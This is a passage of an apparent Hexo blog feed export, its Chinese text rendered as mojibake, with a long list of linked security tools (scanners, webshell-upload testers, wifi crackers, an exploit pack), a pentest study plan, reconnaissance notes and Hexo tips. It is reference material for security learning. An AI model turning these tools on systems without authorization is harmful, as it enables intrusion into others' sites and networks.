href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a><br>(WordPressçš„æ¼æ´æ‰«æå™¨ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒæ•æ„Ÿæ–‡ä»¶æ³„éœ²æ‰«æ)<br><a href="https://github.com/retirejs/retire.js">https://github.com/retirejs/retire.js</a><br>(æ£€æµ‹ç½‘ç«™ä¾èµ–çš„JavaScriptåº“ä¸­å­˜åœ¨çš„å·²çŸ¥é€šç”¨æ¼æ´)<br><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a><br>(è‡ªåŠ¨æ£€æµ‹ä¸Šä¼ åŠŸèƒ½æ˜¯å¦å¯ä¸Šä¼ webshell)<br><a href="https://github.com/mobrine-mob/M0B-tool">https://github.com/mobrine-mob/M0B-tool</a><br>(CMSæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/rezasp/vbscan">https://github.com/rezasp/vbscan</a><br>(è®ºå›æ¡†æ¶vBulletiné»‘ç›’æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/MrSqar-Ye/BadMod">https://github.com/MrSqar-Ye/BadMod</a><br>(CMSæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a><br>(CMSæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨å¥—ä»¶)<br><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a><br>(AWSå®‰å…¨å®¡è®¡å·¥å…·)<br><a href="https://github.com/radenvodka/SVScanner">https://github.com/radenvodka/SVScanner</a><br>(é’ˆå¯¹wpï¼Œmagentoï¼Œjoomlaç­‰CMSçš„æ¼æ´æ‰«æå™¨åŠè‡ªåŠ¨åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/rezasp/joomscan">https://github.com/rezasp/joomscan</a><br>(OWASPæ——ä¸‹joomlaæ¼æ´æ‰«æé¡¹ç›®)<br><a href="https://github.com/6IX7ine/djangohunter">https://github.com/6IX7ine/djangohunter</a><br>(ç”¨äºæ£€æµ‹å› é”™è¯¯é…ç½®å¯¼è‡´æ•æ„Ÿä¿¡æ¯æš´éœ²çš„Djangoåº”ç”¨ç¨‹åº)<br><a href="https://github.com/savio-code/fern-wifi-cracker/">https://github.com/savio-code/fern-wifi-cracker/</a><br>(æ— çº¿å®‰å…¨å®¡è®¡å·¥å…·)<br><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a><br>(Pythonç½‘ç»œ/æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a><br>(æ— çº¿å®‰å…¨æ¸—é€æµ‹è¯•å¥—ä»¶)<br><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a><br>(æ— çº¿ç½‘ç»œå®¡è®¡å·¥å…·ï¼Œæ”¯æŒ2-5GHZé¢‘æ®µ)<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>(ARPæ¬ºéª—ï¼Œæ— çº¿ç½‘ç»œåŠ«æŒ)<br><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a><br>(æ£€æŸ¥wifiæ˜¯å¦æ˜¯â€œå¤§è èâ€æ‰€å¼€æ”¾çš„çƒ­ç‚¹ï¼Œå¹¶ç»™äºˆç½‘ç»œè¯„åˆ†)<br><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a><br>(è‡ªåŠ¨åŒ–æ— çº¿ç½‘ç»œæ”»å‡»å·¥å…·wifiteçš„é‡æ„ç‰ˆæœ¬)<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>(åŸºäºBBScan via.lijiejieçš„æœ¬åœ°ç½‘ç»œæ‰«æ)<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>(åŸºäºJavaScriptçš„çš„æœ¬åœ°ç½‘ç»œæ‰«æ)<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>(ç™½ç›’ä»£ç å®‰å…¨å®¡è®¡ç³»ç»Ÿ)<br><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a><br>(é™æ€PHPä»£ç å®¡è®¡)<br><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a><br>(è·Ÿè¸ªï¼Œåˆ†æPHPè¿è¡Œæƒ…å†µçš„å·¥å…·)<br><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a><br>(çš„NodeJSåº”ç”¨ä»£ç å®¡è®¡)<br><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a><br>(Pythonåº”ç”¨å®¡è®¡)<br><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a><br>(Ruby on Railsåº”ç”¨é™æ€ä»£ç åˆ†æ)<br><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a><br>(Pythonåº”ç”¨é™æ€ä»£ç å®¡è®¡)<br><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a><br>(WordPressæ’ä»¶ä»£ç å®‰å…¨å®¡è®¡)<br><a href="https://github.com/emanuil/php-reaper">https://github.com/emanuil/php-reaper</a><br>(ç”¨äºæ‰«æPHPåº”ç”¨ç¨‹åºä¸­å¯èƒ½å­˜åœ¨SQLæ¼æ´çš„ADOdbä»£ç )<br><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a><br>(ç”¨äºæ£€æµ‹æ½œåœ¨å®‰å…¨æ¼æ´çš„PHPé™æ€ä»£ç åˆ†æå·¥å…·)<br><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a><br>(è‡ªåŠ¨æ¼æ´æ‰«æå™¨ï¼Œå­åŸŸåçˆ†ç ´ï¼Œç«¯å£æ‰«æï¼Œç›®å½•çˆ†ç ´ï¼Œå¸¸ç”¨æ¡†æ¶æ¼æ´æ£€æµ‹)<br><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a><br>(é›†åˆowasp top10æ¼æ´æ‰«æå’Œè¾¹ç•Œèµ„äº§å‘ç°èƒ½åŠ›çš„åˆ†å¸ƒå¼webæ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a><br>(BkScanneråˆ†å¸ƒå¼ï¼Œæ’ä»¶åŒ–webæ¼æ´æ‰«æå™¨)<br><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a><br>(ysrcå‡ºå“çš„è¢«åŠ¨å¼æ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a><br>(åŸºäºhttpä»£ç†çš„webæ¼æ´æ‰«æå™¨)<br><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a><br>(è‡ªåŠ¨åŒ–æ‰«æå™¨ï¼ŒåŒ…æ‹¬ä¸­é—´ä»¶æ‰«æä»¥åŠè®¾å¤‡æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a><br>(å®šå‘å…¨è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a><br>(è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œæ”¯æŒcdnçœŸå®ipæŸ¥æ‰¾ï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰)<br><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a><br>(èŸ’æ’ä»¶åŒ–æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒç”Ÿæˆæ‰«ææŠ¥è¡¨)<br><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a><br>(æ¸—é€æµ‹è¯•æ’ä»¶åŒ–å¹¶å‘æ¡†æ¶)<br><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a><br>(æ”¯æŒæ£€æµ‹SQLI/ XSS / LFI / RFIç­‰æ¼æ´çš„æ‰«æå™¨)<br><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a><br>(Webå›¾å½¢åŒ–çš„æ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a><br>(ä¸€æ¬¾ç½‘ç»œåŒ–çš„è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a><br>(ä¸€æ¬¾é›†æˆä¿¡æ¯æ”¶é›†ï¼Œæ¼æ´æ‰«æï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰çš„å¤šåˆä¸€æ‰«æå·¥å…·)<br><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a><br>(é«˜åº¦é›†æˆåŒ–çš„Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶ï¼Œæ”¯æŒRESTï¼ŒRPCç­‰apiè°ƒç”¨)<br><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a><br>(é›†æˆåŒ–æ¸—é€æµ‹è¯•è¾…åŠ©å¹³å°åŠæ¼æ´ç®¡ç†å¹³å°)<br><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a><br>(æ¸—é€æµ‹è¯•é›†æˆæ¡†æ¶ï¼ŒåŒ…å«è¶…è¿‡38,000+æ”»å‡»)<br><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a><br>(åŸºäºé“¬/æ­Œå‰§æ’ä»¶çš„è¢«åŠ¨å¼æ¼æ´æ‰«æ)<br><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a><br>(æ”¯æŒå¤šç§ç½‘ç»œæ¼æ´æ‰«æï¼Œå‘½ä»¤è¡Œç¯å¢ƒä½¿ç”¨)<br><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a><br>(webåº”ç”¨æ‰«æå™¨ï¼Œæ”¯æŒæŒ‡çº¹è¯†åˆ«ï¼Œæ–‡ä»¶ç›®å½•çˆ†ç ´ï¼ŒSQL / XSS / RFIç­‰æ¼æ´æ‰«æï¼Œä¹Ÿå¯ç›´æ¥ç”¨äºstrutsï¼ŒShellShockç­‰æ‰«æ)<br><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a><br>(é›†æˆå­åŸŸåæšä¸¾ï¼Œnmapï¼ŒwafæŒ‡çº¹è¯†åˆ«ç­‰æ¨¡å—çš„webåº”ç”¨æ‰«æå™¨)<br><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a><br>(ä½¿ç”¨rubyå¼€å‘çš„æ‰«æç½‘ç»œä¸­ä¸»æœºå­˜åœ¨çš„ç¬¬ä¸‰æ–¹webåº”ç”¨æœåŠ¡æ¼æ´)<br><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a><br>(Webåº”ç”¨è‡ªåŠ¨åŒ–æ‰«ææ¡†æ¶ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–ä¸Šä¼ webshell)<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>(ä¸€æ¬¾å¼€æºPocè°ƒç”¨æ¡†æ¶ï¼Œå¯è½»æ¾è°ƒç”¨Pocsuiteï¼ŒTangscanï¼ŒBeebeetoï¼ŒKnowsecè€ç‰ˆæœ¬POCï¼Œå¯ä½¿ç”¨dockeréƒ¨ç½²)<br><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a><br>(æ–—è±¡èƒ½åŠ›ä¸­å¿ƒå‡ºå“å¹¶é•¿æœŸç»´æŠ¤çš„å¼€æºæ¼æ´æ£€æµ‹æ¡†æ¶)<br><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a><br>(Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a><br>(Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶ï¼ŒåŸºäºpython3)<br><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a><br>(è¢«åŠ¨å¼æ¼æ´æ‰«æï¼Œæ”¯æŒå†å²cveç¼–å·æ¼æ´è¯†åˆ«)<br><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a><br>(OWASP ZAPæ ¸å¿ƒé¡¹ç›®å‡ºå“çš„ç»¼åˆæ€§æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>(WebæœåŠ¡ç»¼åˆå‹æ‰«æå™¨ï¼Œç”¨äºæŒ‡å®šç›®æ ‡çš„èµ„äº§æ”¶é›†ï¼Œå®‰å…¨é…ç½®ç¼ºé™·æˆ–è€…å®‰å…¨æ¼æ´æ‰«æ)<br><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a><br>(ä¸€æ¬¾å¤šæ–¹ä½ä¿¡æ¯æ”¶é›†ï¼ŒæŒ‡çº¹è¯†åˆ«åŠæ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a><br>(ä¸€æ¬¾webåº”ç”¨æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒæ‰«æåå°„å‹ä»¥åŠå­˜å‚¨å‹xssï¼Œsql injectionç­‰æ¼æ´ï¼Œæ”¯æŒè¾“å‡ºpdfæŠ¥å‘Š)<br><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ï¼Œç»¼åˆåˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/toyakula/luna">https://github.com/toyakula/luna</a><br>(åŸºäºè¢«åŠ¨å¼æ‰«ææ¡†æ¶çš„è‡ªåŠ¨åŒ–webæ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©æ¡†æ¶ï¼ŒåŒ…å«ä¿¡æ¯æœé›†ï¼Œæ— çº¿æ¸—é€ï¼Œç½‘ç»œåº”ç”¨æ‰«æç­‰åŠŸèƒ½)<br><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a><br>(å†…ç½®1200+æ’ä»¶çš„webæ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/YalcinYolalan/WSSAT">https://github.com/YalcinYolalan/WSSAT</a><br>(WebæœåŠ¡å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œæä¾›åŸºäºwindowsæ“ä½œç³»ç»Ÿçš„ç®€å•.exeåº”ç”¨)<br><a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a><br>(ä½¿ç”¨å»å¼€å‘çš„å¯æ‰©å±•ä»¥åŠé«˜å¹¶å‘æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a><br>(åŸºäºFlaskåº”ç”¨æ¡†æ¶çš„æ¼æ´æ‰«æç³»ç»Ÿ)<br><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a><br>(ä¸€ä¸ªæ“ä½œä¸Šç±»ä¼¼metasploitçš„webåº”ç”¨å®‰å…¨å®¡è®¡æ¡†æ¶)<br><a href="https://github.com/joker25000/Optiva-Framework">https://github.com/joker25000/Optiva-Framework</a><br>(ä¸€æ¬¾webåº”ç”¨æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒæ‰«æåå°„å‹ä»¥åŠå­˜å‚¨å‹xssï¼Œsql injectionç­‰æ¼æ´)<br><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a><br>(é›†æˆ104ä¸ªæ¨¡å—çš„Webåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a><br>(ä¸€æ¬¾APTå…¥ä¾µç—•è¿¹æ‰«æå™¨)<br><a href="https://github.com/w3h/icsmaster/tree/master/nse">https://github.com/w3h/icsmaster/tree/master/nse</a><br>(ICSè®¾å¤‡nmapæ‰«æè„šæœ¬)<br><a href="https://github.com/OpenNetworkingFoundation/DELTA">https://github.com/OpenNetworkingFoundation/DELTA</a><br>(SDNå®‰å…¨è¯„ä¼°æ¡†æ¶)</p>
]]></content>
      <categories>
        <category>å·¥å…·æ‰‹å†Œ</category>
      </categories>
      <tags>
        <tag>å·¥å…·æ‰‹å†Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸ªäººè§„åˆ’</title>
    <url>/posts/d7c4f825/</url>
    <content><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨è€ƒç ”å’Œå°±ä¸šä¸Šæœ‰æ‰€çŠ¹è±«ï¼Œè¿™ä¸¤å¤©å›å®¶å‘†äº†å‡ å¤©ï¼Œä»”ç»†æƒ³äº†æƒ³ï¼Œæœ€ç»ˆè¿˜æ˜¯å†³å®šé€‰æ‹©å°±ä¸šï¼Œä¸å»è€ƒç ”äº†ã€‚åœ¨è¿™åŠå¹´ä¸­ï¼Œè¦å¥½å¥½å‡†å¤‡ï¼Œç­‰æš‘å‡æˆ–è€…å¼€å­¦åå»å¤–é¢å®ä¹ ã€‚åœ¨è¿™æœŸé—´ï¼Œè¦å¥½å¥½å­¦ä¹ ä»¥ä¸‹ä¸€äº›çŸ¥è¯†ã€‚ä¹‹å‰hvvé¢è¯•äº†å››æ¬¡ï¼Œé¢è¯•å‰ä¹Ÿæ²¡å†æ¥è§¦è¿™äº›å…‘ç°ï¼Œå†å­¦ä¹ é«˜æ•°è‹±è¯­å•¥çš„ï¼Œç°åœ¨åšå¥½å†³å®šäº†ï¼Œé‚£å°±è®¤çœŸå‡†å¤‡å§~</p>
<p>åšå®¢ä¹Ÿä¼šå³ä½¿æ›´æ–°ï¼Œå¸Œæœ›æ¯å¤©éƒ½å¯ä»¥å­¦åˆ°å†™ä¸œè¥¿å§ã€‚</p>
<br>

<ul>
<li>åŸºç¡€æ¼æ´åŸç†åŠåˆ©ç”¨</li>
</ul>
<ol>
<li>xss</li>
<li>sqlæ³¨å…¥</li>
<li>ssrf</li>
<li>csrf</li>
<li>XXE</li>
<li>ååºåˆ—åŒ–</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>é€»è¾‘æ¼æ´</li>
<li>â€¦ ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>å·¥å…·ä½¿ç”¨</li>
</ul>
<ol>
<li>burp suite åŠæ’ä»¶</li>
<li>sqlmap</li>
<li>nmap</li>
<li>msf</li>
<li>xray</li>
<li>fuzzscan</li>
<li>Goby </li>
<li>â€¦. ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>è„šæœ¬ç¼–å†™</li>
</ul>
<ol>
<li>æ‰¹é‡payload</li>
<li>scan</li>
</ol>
<ul>
<li>æ¼æ´å¤ç°</li>
</ul>
<ol>
<li>vulhub</li>
<li>dwva</li>
<li>sqli</li>
<li>zkaq</li>
<li>â€¦   (æœ‰å¾…è¡¥å……)</li>
</ol>
<ul>
<li>ç½‘ç»œåè®®</li>
</ul>
<ol>
<li>TCP/IP</li>
<li>UDP</li>
<li>ä¸‰æ¬¡æ¡æ‰‹</li>
<li>â€¦   ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>å†…ç½‘å®‰å…¨</li>
<li>APPæ¸—é€</li>
</ul>
]]></content>
      <categories>
        <category>è§„åˆ’</category>
      </categories>
      <tags>
        <tag>è§„åˆ’</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›†</title>
    <url>/posts/312e3d12/</url>
    <content><![CDATA[<h2 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h2><h3 id="webæ¥å£æŸ¥è¯¢"><a href="#webæ¥å£æŸ¥è¯¢" class="headerlink" title="webæ¥å£æŸ¥è¯¢:"></a>webæ¥å£æŸ¥è¯¢:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
<h3 id="whoiså‘½ä»¤æŸ¥è¯¢"><a href="#whoiså‘½ä»¤æŸ¥è¯¢" class="headerlink" title="whoiså‘½ä»¤æŸ¥è¯¢"></a>whoiså‘½ä»¤æŸ¥è¯¢</h3><p>kaliä¸­è‡ªå¸¦whoisæŸ¥è¯¢å·¥å…·  <code>whois åŸŸå</code>è¿›è¡ŒæŸ¥è¯¢</p>
<h2 id="å­åŸŸåä¿¡æ¯æ”¶é›†"><a href="#å­åŸŸåä¿¡æ¯æ”¶é›†" class="headerlink" title="å­åŸŸåä¿¡æ¯æ”¶é›†"></a>å­åŸŸåä¿¡æ¯æ”¶é›†</h2><h3 id="å­åŸŸåæ”¶é›†å·¥å…·"><a href="#å­åŸŸåæ”¶é›†å·¥å…·" class="headerlink" title="å­åŸŸåæ”¶é›†å·¥å…·"></a>å­åŸŸåæ”¶é›†å·¥å…·</h3><ol>
<li>layerå­åŸŸåæŒ–æ˜æœº</li>
<li>subDomainsBrute</li>
<li>Maltego CE</li>
<li>dnsenum</li>
</ol>
<br>

<h2 id="æ—ç«™-Cæ®µ"><a href="#æ—ç«™-Cæ®µ" class="headerlink" title="æ—ç«™/Cæ®µ"></a>æ—ç«™/Cæ®µ</h2><ul>
<li>æ—ç«™æŸ¥è¯¢ï¼š<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li>
<li>åœ¨çº¿å·¥å…·ï¼š<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li>åœ¨çº¿å·¥å…·ï¼š<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
<li>CDNæ£€æµ‹ï¼š<a href="https://www.17ce.com/">https://www.17ce.com/</a></li>
</ul>
<h2 id="CMSæŒ‡çº¹è¯†åˆ«"><a href="#CMSæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«"></a>CMSæŒ‡çº¹è¯†åˆ«</h2><ul>
<li><p>åœ¨çº¿æŒ‡çº¹è¯†åˆ«ï¼š<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
</li>
<li><p>æ½®æ±æŒ‡çº¹ï¼š<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p>
</li>
</ul>
<h2 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h2><ul>
<li>å¾¡å‰‘</li>
<li>dirsearch</li>
<li>DirBuster</li>
</ul>
<br>

<h2 id="ç«¯å£ä¿¡æ¯"><a href="#ç«¯å£ä¿¡æ¯" class="headerlink" title="ç«¯å£ä¿¡æ¯"></a>ç«¯å£ä¿¡æ¯</h2><h3 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>ä½¿ç”¨åœ¨çº¿ç½‘ç«™æ¢æµ‹ <a href="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/</a></li>
</ul>
<h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><ul>
<li>å…³é—­ä¸å¿…è¦çš„ç«¯å£</li>
<li>å¯¹é‡è¦ä¸šåŠ¡çš„æœåŠ¡ç«¯å£è®¾ç½®é˜²ç«å¢™</li>
<li>ç»å¸¸æ€§æ›´æ”¹ç”¨æˆ·å¯†ç </li>
</ul>
<br>

<h2 id="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"><a href="#ç½‘ç»œç©ºé—´æœç´¢å¼•æ“" class="headerlink" title="ç½‘ç»œç©ºé—´æœç´¢å¼•æ“"></a>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“</h2><ul>
<li>fofa: <a href="https://fofa.so/">https://fofa.so/</a></li>
<li>é’Ÿé¦—ä¹‹çœ¼ï¼š<a href="http://www.zoomeye.org/">http://www.zoomeye.org</a></li>
<li>Shodanï¼š<a href="https://www.shodan.io/">https://www.shodan.io</a></li>
</ul>
<h2 id="GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼"><a href="#GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼" class="headerlink" title="GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼"></a>GitHubæ•æ„Ÿä¿¡æ¯æ³„æ¼</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a></p>
]]></content>
      <categories>
        <category>ä¿¡æ¯æ”¶é›†</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoåŸºæœ¬ä½¿ç”¨</title>
    <url>/posts/d4fee3ae/</url>
    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #ç”Ÿäº§é™æ€ç½‘é¡µ<br><code>hexo s </code> == <code>hexo server</code> #å¯åŠ¨æœåŠ¡é¢„è§ˆ<br><code>hexo d</code> == <code>hexo deploy</code> #éƒ¨ç½²<br><code>hexo clean</code> #æ¸…é™¤ç¼“å­˜</p>
<h3 id="å†™æ–‡ç« "><a href="#å†™æ–‡ç« " class="headerlink" title="å†™æ–‡ç« "></a>å†™æ–‡ç« </h3><p><code>hexo new post â€œæ ‡é¢˜â€</code>  æ–°å»ºä¸€ç¯‡æ–‡ç«   ç„¶åä¼šåœ¨_postç›®å½•ä¸‹æ‰¾åˆ°æ–°å¢çš„.mdæ–‡ä»¶ï¼Œç”¨æ­¤æ–‡ä»¶æ¥å­˜æ–¹æ‰€ä¹ å¾—å†…å®¹ç¼–å†™å®Œmarkdownæ–‡ä»¶åï¼Œæ ¹ç›®å½•ä¸‹è¾“å…¥<code> hexo g</code>ç”Ÿäº§é™æ€é¡µé¢ã€‚è¾“å…¥<code>hexo s</code>æœ¬åœ°é¢„è§ˆæ•ˆæœï¼Œ<code>hexo d</code>ä¸Šä¼ è‡³GitHub</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoæ–‡ç« æ¨¡æ¿è®¾ç½®</title>
    <url>/posts/2b14b1c3/</url>
    <content><![CDATA[<p>æ‰“å¼€hexoé¡¹ç›®æ–‡ä»¶å¤¹å¼ çš„scaffoldä¸­çš„<code>post.md</code>å’Œ<code>draft.md</code>,å¹¶ä¿®æ”¹<br>å¯¹åº”çš„æ˜¯ <code>hexo new &lt;title&gt;</code> é»˜è®¤æ˜¯<code>post</code>ï¼Œè‰ç¨¿æ˜¯<code>draft</code></p>
<blockquote>
<hr>
<p>title: hexoæ–‡ç« æ¨¡æ¿è®¾ç½®<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
<hr>
</blockquote>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨proxychains4gitcloneæ‹’ç»è®¿é—®</title>
    <url>/posts/3a6e39d4/</url>
    <content><![CDATA[<p>é—®é¢˜:Ubuntuä½¿ç”¨proxychain4 git clone æŠ¥é”™ 192.168.3.11 1080 æ‹’ç»è®¿é—®<br>åŸå› : ç«¯å£è¢«å ç”¨äº†ï¼Œä¹‹å‰åœ¨è™šæ‹ŸæœºUbuntuçš„ä»£ç†åœ°æ–¹è®¾ç½®äº†ä»£ç†ï¼Œå†ç”¨ä½¿ç”¨proxychain4ï¼ŒæŠŠåœ¨è™šæ‹Ÿæœºä¸­çš„ä»£ç†è®¾ç½®å–æ¶ˆæ‰å°±å¯ä»¥äº†</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…pip2</title>
    <url>/posts/6b338ac1/</url>
